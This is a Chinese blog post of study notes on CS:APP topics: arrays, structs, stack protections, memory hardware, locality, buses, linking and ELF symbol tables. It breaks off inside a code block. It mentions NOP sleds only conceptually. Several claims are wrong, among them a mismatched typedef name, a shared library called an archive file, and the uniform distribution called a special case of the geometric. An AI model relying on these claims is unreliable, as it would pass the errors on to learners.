<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>过程是软件中一种很重要的抽象，它提供了一种 <strong>封装</strong> 代码的方式，用一组 <strong>指定的参数</strong> 和一个 <strong>可选择的返回值</strong> 实现了某种功能，而程序可以在任何一个位置引用这种功能</p>
<p>设计良好的软件用 <strong>过程</strong> 作为抽象机制，隐藏某个行为的具体表现，同时又提供清晰简洁的 <strong>接口定义</strong> ，说明需要计算的是哪些值，过程会对程序状态产生什么影响</p>
<p>过程在不同的<strong>编译语言</strong>中有不同的名称：函数（Function），方法（method），子例程，处理函数</p>
<h2 id="嵌套数组-amp-变长数组"><a href="#嵌套数组-amp-变长数组" class="headerlink" title="嵌套数组&amp;变长数组"></a>嵌套数组&amp;变长数组</h2><p>嵌套数组：（多维数组）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> A[<span class="number">5</span>][<span class="number">3</span>]</span><br><span class="line">------------------------</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> row3_[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">row3_t</span> A[<span class="number">5</span>];</span><br></pre></td></tr></table></figure>
<p>两者是等价的</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640064445176-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640064445176"> 
<p>变长数组：</p>
<p>变长数组既数组大小待定的数组， C语言中结构体的最后一个元素可以是大小未知的数组，也就是所谓的0长度，所以我们可以用结构体来创建变长数组 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">array</span>[];</span><br><span class="line">&#125;SoftArray;</span><br></pre></td></tr></table></figure>
<h2 id="异质的数据结构"><a href="#异质的数据结构" class="headerlink" title="异质的数据结构"></a>异质的数据结构</h2><p>c语言提供了两种不同类型的对象组合到一起创建数据类型的机制：</p>
<p>1.结构（structure）    2.联合（union）</p>
<p>structure可以将多个对象集合到一个单位中</p>
<p>union可以用几种不同的类型来引用一个对象</p>
<h2 id="缓存区保护"><a href="#缓存区保护" class="headerlink" title="缓存区保护"></a>缓存区保护</h2><p>1.栈随机化</p>
<p>使栈在每一次加载时都会发生变化</p>
<p>对抗：空操作雪橇，在shellcode前面插入相等长度的“nop”，只要有一个地址命中“nop”就行</p>
<p>​        //汇编指令“nop”让IP指针+1，没有其他作用</p>
<p>2.栈破坏机制</p>
<p>Canary（金丝雀）是系统生成的一个随机数，如果它被破坏，系统就会强行终止程序</p>
<p>3.限制可执行权限</p>
<h2 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h2><p>以“ . ”开头的指令就是 <strong>伪指令</strong> ，它们告诉汇编器<strong>调整地址</strong>，以便在那里产生代码或插入一些数据</p>
<p>例如：伪指令“.pos 0”告诉汇编器应该从地址“0”开始产生代码</p>
<h2 id="控制语言-HCL"><a href="#控制语言-HCL" class="headerlink" title="控制语言(HCL)"></a>控制语言(HCL)</h2><p>大多数现代的电路技术都是用<strong>信号线上的高低电压</strong>来表示不同的值</p>
<p>​        //逻辑1用1.0伏特的高电压，逻辑0用0.0伏特的低电压</p>
<p>为了方便编程，<strong>硬件描述语言HDL</strong>（Hardware Description Language）诞生了</p>
<p>HDL是一种文本表示，和编程语言类似，但是它是用来描述 <strong>硬件结构</strong> 而不是 <strong>程序行为</strong> 的</p>
<p>HCL语言只表达硬件设计的<strong>控制逻辑</strong>部分，只有有限的操作集合（控制逻辑是处理器中最困难的）</p>
<h2 id="逻辑门"><a href="#逻辑门" class="headerlink" title="逻辑门"></a>逻辑门</h2><p>逻辑门是数字电路的基本计算单元，它们的产生和输出，等于它们输入位数的某个布尔函数</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640840566258-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640840566258"> 
<h2 id="组合电路"><a href="#组合电路" class="headerlink" title="组合电路"></a>组合电路</h2><p>将很多的逻辑门组合成一个网，就可以构建出一个<strong>计算块</strong>（computational block），称为组合电路</p>
<h2 id="优化编译器的能力"><a href="#优化编译器的能力" class="headerlink" title="优化编译器的能力"></a>优化编译器的能力</h2><img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640841353636-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640841353636"> 
<p>这两个函数有相同的功能，但CPU读写效率却有不同：</p>
<p>第一个函数需要：2次读 <em>xp，2次读 </em>yp，2次写 *xp</p>
<p>第二个函数需要：1次读 <em>xp，1次读 </em>yp，1次写 *xp</p>
<h2 id="程序性能的表示"><a href="#程序性能的表示" class="headerlink" title="程序性能的表示"></a>程序性能的表示</h2><p>我们引入度量标准：<strong>每元素的周期数</strong>（Cycles Per Element），作为一种表示程序性能并指引我们改进代码的方法</p>
<p>处理器活动的顺序是由时钟控制的，时钟提供了某个频率的规律信号，通常用<strong>千兆赫兹</strong>，十亿周期每秒来表示</p>
<p>例如：一个系统有“4GHz”处理器，表示这个系统的处理器时钟运行频率为<strong>4 * 10的9次方 /每秒</strong></p>
<h2 id="存储器系统"><a href="#存储器系统" class="headerlink" title="存储器系统"></a>存储器系统</h2><p>存储器系统是一个具有不同<strong>容量，成本，访问时间</strong>的存储设备层次结构</p>
<p>靠近CPU的，小的，快速的，称为<strong>高速缓存存储器</strong></p>
<p>这个思想围绕着计算机程序的一种称为 <strong>局部性</strong> 的基本属性，具有良好局部性的程序倾向于一次又一次地访问相同的 <strong>数据项集合</strong> ，或是倾向访问邻近的 <strong>数据项集合</strong> ，并且更多的倾向于从存储器层次结构中较高层次处访问 <strong>数据项集合</strong> ，这些操作都可以使程序运行得更快</p>
<h2 id="局部性"><a href="#局部性" class="headerlink" title="局部性"></a>局部性</h2><p><strong>简述</strong></p>
<p>原指处理器在访问某些数据时短时间内存在重复访问，某些数据或者位置访问的 <strong>概率极大</strong> ，大多数时间只访问局部的数据（随着优化技术的提升，局部性的概念也得到了扩充）</p>
<p>其实就是概率的不均等，这个宇宙中，很多东西都不是平均分布的，平均分布是概率论中几何分布的一种特殊形式，非常简单，但世界就是没这么简单。我们更长听到的发布叫做高斯发布，同时也被称为正态分布，因为它就是正常状态下的概率发布，起概率图如下 ：</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640843878222-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640843878222"> 
<p><strong>时间局部性(Temporal locality):</strong> </p>
<p>如果某个信息这次被访问，那它有可能在不久的未来被多次访问</p>
<p>时间局部性是空间局部性访问地址一样时的一种特殊情况，这种情况下，可以把常用的数据加<strong>cache</strong>（缓存）来优化访存</p>
<p><strong>空间局部性(Spatial locality):</strong> </p>
<p>如果某个位置的信息被访问，那和它相邻的信息也很有可能被访问到</p>
<p>这个也很好理解，我们大部分情况下代码都是顺序执行，数据也是顺序访问的 </p>
<p><strong>内存局部性(Memory locality):</strong> </p>
<p>访问内存时，大概率会访问连续的块，而不是单一的内存地址，其实就是 <strong>空间局部性在内存上</strong> 的体现</p>
<p>目前计算机设计中，都是以块/页为单位管理调度存储，其实就是在利用空间局部性来优化性能 </p>
<p><strong>分支局部性(Branch locality)</strong> </p>
<p>这个又被称为顺序局部性，计算机中大部分指令是顺序执行，即便有if这种选择分支，其实大多数情况下某个分支都是被大概率选中的</p>
<p>于是就有了CPU的分支预测优化，设计CPU优先选择 <strong>概率较大 </strong>的if分支</p>
<p><strong>等距局部性(Equidistant locality)</strong> </p>
<p>等距局部性是指如果某个位置被访问，那和它 <strong>相邻等距离的连续地址</strong> 极有可能会被访问到，它位于空间局部性和分支局部性之间</p>
<p>举个例子，比如多个相同格式的数据数组，你只取其中每个数据的一部分字段，那么他们可能在内存中地址距离是等距的，这个可以通过简单的线性预测就预测是未来访问的位置</p>
<p><strong>步长对局部性的影响</strong></p>
<p>步长：连续序列号的差值</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641115117925-1646286364493-1646808754596-1646808862602.png" class width="1641115117925"> 
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641115127425-1646286364493-1646808754596-1646808862602.png" class width="1641115127425"> 
<p>两个函数只是交互了循环的次序，但程序的性能却截然不同</p>
<p>第一个程序：步长为“4”（int类型） [ 4 - 0 ]</p>
<p>第二个程序：步长为“12”（int类型 * 3）[ 12 - 0 ]</p>
<p>第一个程序的性能远高于第二个程序（步长越长，性能越差）</p>
<h2 id="存储技术"><a href="#存储技术" class="headerlink" title="存储技术"></a>存储技术</h2><p><strong>静态RAM</strong>（SRAM）</p>
<p>SRAM将每个<strong>位</strong>存储在一个 <strong>双稳态</strong> 的存储器单元中（每个单元通常是用一个 <strong>6晶体管电路</strong> 来实现的）</p>
<p>这个电路有这样一个属性：它可以无限期地保持 “两个不同的电压配置” 中的一个</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640849464616-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640849464616"> 
<p>这个<strong>双稳态</strong>的存储器单元就像图中的钟摆一样，除了左右稳态以外的任何区域都是不稳定的</p>
<p>只要有电，它就会永远保持它的值，即使有外界干扰也会马上回复</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641013069193-1646286364493-1646808754596-1646808862602.png" class width="1641013069193"> 
<p><strong>动态RAM</strong>（DRAM）</p>
<p>DRAM将每个<strong>位</strong>存储为一个 <strong>电容的充电</strong>（每个单元由一个 <strong>电容</strong> 和一个 <strong>访问晶体管</strong> 组成）</p>
<p>和SRAM有着较强的稳定性不同，DRAM对干扰非常敏感，电容电压被扰乱以后就不会恢复了</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640850052720-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640850052720"> 
<p>DRAM芯片被封装在内存模块中</p>
<p>内存模块 (Memory Module)是指一个 <strong>印刷电路板</strong> 表面上有镶嵌数个 <strong>记忆体</strong> ， <strong>芯片chips</strong>(碎片)，而这 内存芯片 通常是 DRAM芯片</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641013117768-1646286364493-1646808754596-1646808862602.png" class width="1641013117768"> 
<p><strong>增强型DRAM</strong></p>
<p>快页模式DRAM（FPM DRAM）</p>
<p>扩展数据DRAM（EDO DRAM）</p>
<p>同步DRAM（SDRAM）</p>
<p>双倍数据速率同步DRAM（DDR SDRAM）</p>
<p>视频RAM（VRAM）</p>
<p><strong>只读存储器ROM</strong>（ROM是一种非易失性存储器）</p>
<p>如果计算机突然断电，DRAM和SRAM都会失去它们的数据，所以它们是<strong>易失的</strong></p>
<p>在失去电源的情况下，数据也不会丢失的存储器就是<strong>非易失性存储器</strong></p>
<p>最开始的ROM是真的“只读”的，但是随着技术的发展，ROM也慢慢“可读”了起来</p>
<p><strong>可编程ROM</strong>（PROM）</p>
<p>PROM只能每编程一次（PROM的每个存储器单元都有一种熔丝（fuse），只能被高温熔断一次）</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641013659516-1646286364493-1646808754596-1646808862602.png" class width="1641013659516"> 
<p><strong>可擦写可编程ROM</strong>（EPROM）</p>
<p>EPROM有一个透明的石英窗口，允许光线到达存储单元，当紫外线射过窗口时，EPROM单元会被清除为“0”，对EPROM的编程需要通过特殊设备（把“1”写入EPROM），EPROM总共可以擦除重编程的次数为：10的3次方</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640852450140-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640852450140"> 
<p><strong>电子可擦除PROM</strong>（EEPROM）</p>
<p>EEPROM和EPROM类似，只不过不用特殊设备就可以对它进行编程，可以直接在印制电路卡上进行编程，EEPROM总共可以被编程的次数为：10的5次方</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640852477583-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640852477583"> 
<p><strong>闪存</strong>（flash memory）</p>
<p>闪存基于EEPROM，是一种重要的存储技术（U盘就是利用Flash实现的）</p>
<p>与前面的PROM，EPROM，EEPROM以 <strong>位</strong> 为单位不同，Flash以 <strong>块</strong> 为单位（128kb，256kb）</p>
<p>Flash的基本构成单位为<strong>浮栅场效应管</strong>（这是一个三端器件，分别为：源极，漏极，栅极）</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640853366687-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640853366687"> 
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640853224793-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640853224793"> 
<p><strong>磁盘</strong></p>
<p>磁盘是用于大量存储数据的存储设备，存储数据的数量级可以达到几千千兆字节，但从磁盘上读取数据的时间为毫秒级，比DRAM慢了10万倍，比SRAM慢了100万倍</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641014928544-1646286364493-1646808754596-1646808862602.png" class width="1641014928544"> 
<p>磁盘由多个重叠在一起的盘片组成，它们被封装在一个密封的包装中</p>
<h2 id="内存结构"><a href="#内存结构" class="headerlink" title="内存结构"></a>内存结构</h2><p>在内存调试时，经常需要用到rank、bank等参数，可以看到电脑的内存条中，有很多一片一片的芯片，这就是内存芯片，也是叫内存颗粒 </p>
<p>内存的基本单元称为 <strong>cell</strong> ，cell按行( <strong>row</strong> )、列( <strong>column</strong> )分布组成一个 <strong>bank</strong> </p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641012026126-1646286364493-1646808754596-1646808862602.png" class width="1641012026126"> 
<p>一颗内存颗粒由多个 <strong>bank</strong> 组成，现在的内存颗粒一般是8个bank，每个bank对于内存来说是平等的关系，因为内存控制器的原因，每个时钟周期只能对一个bank进行操作 </p>
<p>所有在内存容量关系中：<strong>颗粒</strong> &gt; <strong>bank</strong> &gt; <strong>row</strong> ， <strong>column</strong> &gt; <strong>cell</strong> </p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641012787423-1646286364493-1646808754596-1646808862602.png" class width="1641012787423"> 
<h2 id="IO桥接器"><a href="#IO桥接器" class="headerlink" title="IO桥接器"></a>IO桥接器</h2><p>数据通过总线进行流通，每次CPU和主存之间的数据传输都是通过一系列步骤完成的，这些步骤被称为<strong>总线事务</strong></p>
<p>读事务：把数据从主存传输到CPU</p>
<p>写事务：把数据从CPU传输到主存</p>
<p>而现代计算机中IO是通过 <strong>共享一条总线</strong> 的方式来实现的，这就是 <strong>IO总线</strong>（I/O bus）</p>
<p>而<strong>IO桥接器</strong>则是一组芯片组（其中包括内存控制器）</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641009467416-1646286364493-1646808754596-1646808862602.png" class width="1641009467416"> 
<p>CPU芯片，IO桥接器，DRAM内存模块</p>
<p>系统总线（system bus）连接了CPU和IO桥接器</p>
<p>内存总线（memory bus）连接IO桥接器和主存</p>
<p>系统总线和内存总线都通过IO桥接器连接到IO总线上，这就实现了各个硬件之间的交互</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641010785822-1646286364493-1646808754596-1646808862602.png" class width="1641010785822"> 
<p>在这个过程中：CPU上被称为<strong>总线接口</strong>的电路会在总线上发起“读事务”</p>
<p>​        //交换“A”和“%rax”位置，则会发起“写事务”</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641011441241-1646286364493-1646808754596-1646808862602.png" class width="1641011441241"> 
<p>CPU会把A放到系统总线上，IO桥接器将信号传递到内存总线,传输到主存</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641011450090-1646286364493-1646808754596-1646808862602.png" class width="1641011450090"> 
<p>接下来主存会识别内存总线上的地址信号，从内存总线中读取地址，从DRAM中取出数据字，并将数据写入内存总线通过IO桥又写入系统总线，传输到CPU</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641011460116-1646286364493-1646808754596-1646808862602.png" class width="1641011460116"> 
<p>最后CPU会读取系统总线上的数据，赋值给寄存器rax</p>
<h2 id="链接器"><a href="#链接器" class="headerlink" title="链接器"></a>链接器</h2><p>链接（linking）是将 <strong>各种代码</strong> 和 <strong>数据片段</strong> 收集并组合成一个单一文件的过程</p>
<p>负责链接工作的程序被称为“链接器”</p>
<p>链接器的出现使我们不用将一个应用组织为一个庞大的文件，而是可以分割为更小的模块</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641352337650-1646286364493-1646808754596-1646808862602.png" class width="1641352337650"> 
<h2 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h2><p>静态链接的链接器必须完成两个任务：符号解析，重定位</p>
<p>符号解析：解析目标文件的符号，把 <strong>符号引用</strong> 和 <strong>符号定义</strong> 关联起来</p>
<p>重定位：通过把 <strong>符号定义</strong> 和 <strong>内存位置</strong> 关联起来，来重定位这些节片段，然后修改对这些符号的引用，使它们指向对应的内存位置</p>
<h2 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h2><p>在创建可执行文件时，静态执行一些链接</p>
<p>在程序加载时，动态完成链接</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641720884346-1646286364493-1646808754596-1646808862602.png" class width="1641720884346"> 
<p>动态链接器通过执行下面的重定位来完成链接任务：</p>
<ul>
<li>重定位 libc.so 的文本和数据到某个内存段</li>
<li>重定位 libvector.so 的文本和数据到另一个内存段</li>
<li>重定位 prog21 中所有的 “由 libc.so 和 libvector.so(存档文件) 定义的” 符号的引用</li>
</ul>
<h2 id="存档文件"><a href="#存档文件" class="headerlink" title="存档文件"></a>存档文件</h2><p>存档文件（libvector.so）是一种文件格式，用于存储一组文件以及与这些文件有关的信息（元数据），创建存档文件的目的是将多个文件存储在一起，通常采用压缩格式，这样可以提高可移植性，同时节省磁盘上的存储空间</p>
<h2 id="目标文件"><a href="#目标文件" class="headerlink" title="目标文件"></a>目标文件</h2><p>目标文件分为3种：</p>
<p>1.可重定位目标文件：包含二进制代码和数据，可以在编译时与其他可重定位目标文件合并，创建一个可执行目标文件</p>
<p>2.可执行目标文件：包含二进制代码和数据，可以直接放入内存执行（就是可执行文件）</p>
<p>3.共享目标文件：一种特殊的可重定位目标文件，可以在加载或者运行时被 <strong>动态</strong> 地加载进内存并进行连接</p>
<p>编译器和汇编器生成：可重定位目标文件</p>
<p>链接器生成：可执行目标文件</p>
<p>各个系统目标文件的格式不同：Unix系统，采用a.out格式；Windows系统，采用PE格式；MacOS系统，采用Mach-O格式</p>
<h2 id="可重定位目标文件"><a href="#可重定位目标文件" class="headerlink" title="可重定位目标文件"></a>可重定位目标文件</h2><img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641279880688-1646286364493-1646808754596-1646808862602.png" class width="1641279880688"> 
<p>这个就是可重定位目标文件的格式，ELF头描述了产生该文件的系统的 <strong>字的大小</strong> 和 <strong>字节序</strong></p>
<p>ELF头剩下的部分包含：帮助链接器进行 <strong>语法分析</strong> 和 <strong>解释目标文件</strong> 的信息</p>
<p>不同节的位置大小是由 “节头部” 决定的，其中目标文件的每个节都有一个固定大小的条目（entry），夹在“ELF头”和“节头部表”之间的都是节</p>
<p>一个经典的ELF可重定位目标文件包含下面几个节：</p>
<p>.text：已经编译的程序机器代码</p>
<p>.rodata：只读数据</p>
<p>.data：已经初始化的 全局变量 和 静态变量（局部变量保存在栈中）</p>
<p>.bss：未初始化的 全局变量 和 静态变量（被初始化为“0”的变量也会保存在这里）</p>
<p>.symtab：符号表，用于存放程序中定义或引用的 “函数和全局变量” 的信息</p>
<p>.rel.text：“.text节”的重定位信息，用于重新修改代码段的指令中的地址信息 </p>
<p>.debug：调试符号表</p>
<p>.line：原始C源程序中的行号 和 “.text节”中机器指令之间的映射</p>
<p>.strtab：字符串表（包含“.symtab”和“.debug”中的符号名和节名）</p>
<h2 id="符号及其相关"><a href="#符号及其相关" class="headerlink" title="符号及其相关"></a>符号及其相关</h2><p><strong>符号（symbol）</strong></p>
<p>函数名，变量名，数组名，结构体名都可以称之为符号</p>
<p>在链接器的上下文中一共有3中不同的符号：</p>
<ul>
<li>Global symbols（模块内部定义的全局符号）<ul>
<li>由模块m定义并能被其他模块引用的符号（非static函数，非static全局变量）</li>
</ul>
</li>
<li>External symbols（外部定义的全局符号）<ul>
<li>由其他模块定义并被模块m引用的全局符号</li>
</ul>
</li>
<li>Local symbols（本模块的局部符号）<ul>
<li>仅由模块m定义和引用的本地符号（带有static的函数和全局变量）</li>
<li>注意：局部变量不会在过程外被引用（分配在栈中），因此不是符号定义</li>
</ul>
</li>
</ul>
<p><strong>符号表（symtab）</strong></p>
<p>符号表是由汇编器构造的，包含一个条目的数组，每个条目都是一个结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        Elf32_Word    st_name;      <span class="comment">/* 符号对应字符串在strtab节中的偏移量 */</span> </span><br><span class="line">        Elf32_Word    st_value;     <span class="comment">/* 在对应节中的偏移量，可执行文件中是虚拟地址 */</span></span><br><span class="line">        Elf32_Word    st_size;      <span class="comment">/* 符号对应目标所占字节数 */</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span>   type: <span class="number">4</span>,    <span class="comment">/* 符号对应目标的类型：数据、函数、源文件、节 */</span></span><br><span class="line">              		 binding: <span class="number">4</span>;    <span class="comment">/* 符号类别：全局符号、局部符号、弱符号 */</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span>   st_other;</span><br><span class="line">        Elf32_Section   st_shndx;    <span class="comment">/* 符号对应目标所在的节，或其他情况 */</span></span><br><span class="line">&#125;Elf32_Sym;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">    Elf64_Word    st_name;        <span class="comment">/* Symbol name (string tbl index) */</span>  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;        <span class="comment">/* Symbol type and binding */</span>  </span><br><span class="line">    <span class="comment">// 高4字节为type，低4字节为binding</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;       <span class="comment">/* Symbol visibility */</span>  </span><br><span class="line">    Elf64_Addr    st_value;       <span class="comment">/* Symbol value */</span>  </span><br><span class="line">    Elf64_Xword   st_size;        <span class="comment">/* Symbol size */</span>  </span><br><span class="line">&#125;Elf64_Sym; </span><br></pre></td></tr></table></figure>
<p>st_name：对应字符串表的偏移</p>
<p>st_value：距离目标符号地址的偏移</p>
<p>st_size：目标的大小</p>
<p>st_info：高字节为type，低字节为binding</p>
<p>type：表示符号类型（要么是数据，要么是函数）</p>
<p>binding：表示符号是本地的，还是全局的</p>
<p><strong>符号和节</strong></p>
<p>每个符号都会被分配到目标文件的某个节，由 section 字段表示，改字段也是一个到节头部表的<strong>索引</strong>，但是存在3个 <strong>伪节</strong> ，它们在节头部表中是没有条目的</p>
<p>ABS：代表不应该被重定位的符号</p>
<p>UNDEF：代表未定义的符号，就是在本目标模块中被引用，但是却在其他地方定义的符号</p>
<p>COMMON：代表未被分配位置的未初始化数据的目录</p>
<p>​        // 只有在可重定位目标文件中才有这些伪节，可执行目标文件是没有的</p>
<p>COMMON和bss节的区别很细微：</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641286551347-1646286364493-1646808754596-1646808862602.png" class width="1641286551347"> 
<p><strong>符号解析</strong></p>
<p>链接器从左往右按照它们在编译器驱动程序命令行上出现的顺序，来扫描可重定位目标文件和存档文件，在这次扫描中，链接器会维护：</p>
<p>一个 <strong>可重定位目标文件的集合E</strong> （将会被合并为可执行目标文件）</p>
<p>一个 <strong>未解析符号集合U</strong> （引用了但是未定义）</p>
<p>一个 <strong>在前面输入文件中已经定义的符号集合D</strong>（自己定义的符号也会被装入）</p>
<p>符号解析的工作流程如下：</p>
<ol>
<li>在命令行上输入文件F，链接器会判断文件F是一个目标文件，还是一个存档文件 </li>
<li>如果是目标文件，则添加到E，并且修改U和D来反应F中的 <strong>符号定义</strong> 和 <strong>引用</strong></li>
<li>如果F是一个存档文件，那么链接会尝试匹配 <strong>未解析符号集合U</strong> 和 <strong>存档文件成员定义的符号</strong> ，假设存档文件中有个成员 m，定义了一个符号来解析U中的一个引用，那么就将 m 添加到E中，并且链接器修改U和D来反映 m 中的 <strong>符号定义</strong> 和 <strong>引用</strong></li>
</ol>
<p>扫描完成以后，集合U非空，链接器就会输出一个错误并终止，以表明有符号未定义</p>
<p>扫描完成以后，集合U为空，那么链接器就会合并集合E中的目标文件，构建可执行文件</p>
<p>​        // 当D被新填入时，对应的U会减少</p>
<p><strong>符号变量</strong></p>
<p>自动变量（动态局部变量）：auto </p>
<ul>
<li>离开函数，值就消失</li>
<li>不写 static 就默认是 auto</li>
</ul>
<p>静态局部变量：static </p>
<ul>
<li>离开函数，值任然保留</li>
<li>变量的值只在函数内部生效</li>
<li>带有 static 的变量只会初始化一次（数据存储在 data 段）</li>
<li>当上一级函数多次调用本函数时，带有 static 的变量数值不变（并且不会进行初始化）</li>
</ul>
<p>寄存器变量：register</p>
<ul>
<li>离开函数，值就消失</li>
<li>变量的值只在函数内部生效</li>
</ul>
<p>全局变量：在 main 之外</p>
<ul>
<li>允许 main 中所有函数访问</li>
<li>允许外部其他文件访问</li>
</ul>
<p>静态全局变量：在 main 之外，static</p>
<ul>
<li>允许 main 中所有函数访问</li>
<li>变量的值只在文件内部生效</li>
</ul>
<h2 id="节"><a href="#节" class="headerlink" title="节"></a>节</h2><p>使用目标文件的节头表，可以定位文件的所有节，节头表是 <code>Elf32_Shdr</code> 或 <code>Elf64_Shdr</code> 结构的数组</p>
<p><strong>节头</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td 